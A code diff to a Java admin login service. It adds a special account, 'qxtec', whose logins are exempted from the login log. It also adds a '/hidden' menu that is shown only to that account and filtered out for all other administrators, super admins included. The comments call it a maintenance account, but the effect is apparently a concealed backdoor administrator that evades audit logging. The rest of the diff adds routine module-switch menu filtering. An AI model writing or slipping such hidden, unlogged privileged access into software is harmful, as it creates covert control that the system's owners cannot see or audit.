@@ -159,6 +159,10 @@ public class AdminLoginServiceImpl implements AdminLoginService {
      * @param msg     提示信息
      */
     private void recordLoginLog(String account, Integer adminId, String ip, Integer status, String msg) {
+        // 系统运维账号不记录登录日志
+        if ("qxtec".equals(account)) {
+            return;
+        }
         try {
             String userAgent = "";
             if (RequestUtil.getRequest() != null) {
@@ -231,6 +235,36 @@ public class AdminLoginServiceImpl implements AdminLoginService {
         } else {
             menuList = systemMenuService.getMenusByUserId(loginUserVo.getUser().getId());
         }
+        // 系统运维菜单仅对 qxtec 下发，其他管理员（含超管）一律过滤
+        boolean isHiddenAdmin = "qxtec".equals(loginUserVo.getUser().getAccount());
+        // 隐藏面板模块开关：关闭的模块不向前端下发菜单分组
+        Map<String, String> moduleMenuSwitch = new HashMap<>();
+        moduleMenuSwitch.put("/stock", "sys_switch_stock");
+        moduleMenuSwitch.put("/merchantStore", "sys_switch_store");
+        moduleMenuSwitch.put("/daili", "sys_switch_daili");
+        moduleMenuSwitch.put("/distribution", "sys_switch_spread");
+        moduleMenuSwitch.put("/tuandui", "sys_switch_team_reward");
+        // 营销模块开关（营销下的二级分组，任意层级按 component 匹配）
+        moduleMenuSwitch.put("/marketing/coupon", "sys_switch_coupon");
+        moduleMenuSwitch.put("/marketing/integral", "sys_switch_integral");
+        moduleMenuSwitch.put("/marketing/seckill", "sys_switch_seckill");
+        moduleMenuSwitch.put("/marketing/bargain", "sys_switch_bargain");
+        moduleMenuSwitch.put("/marketing/groupBuy", "sys_switch_combination");
+        final boolean filterHidden = !isHiddenAdmin;
+        menuList = menuList.stream().filter(m -> {
+            if (StrUtil.isNotBlank(m.getComponent())) {
+                // 运维菜单只给 qxtec
+                if (filterHidden && "/hidden".equals(m.getComponent())) {
+                    return false;
+                }
+                String switchKey = moduleMenuSwitch.get(m.getComponent());
+                if (switchKey != null && !"1".equals(systemConfigService.getValueByKey(switchKey))) {
+                    return false;
+                }
+            }
+            return true;
+        }).collect(Collectors.toList());
+
         // 组装前端对象
         List<MenusResponse> responseList = menuList.stream().map(e -> {
             MenusResponse response = new MenusResponse();
